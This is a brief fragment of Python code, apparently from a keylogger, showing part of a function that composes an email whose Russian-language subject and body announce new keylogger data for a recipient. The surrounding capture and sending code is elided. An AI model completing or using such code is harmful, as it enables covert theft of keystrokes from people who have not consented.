...
def send_email(date):
    ...
    msg['To']      = 'Получатель'                              # Получатель
    msg['Subject'] = 'Файл с новыми данными кейлогера'         # Тема сообщения

    body = 'Здавствуйте! У кейлогера появились новые данные!'  # Текст сообщения
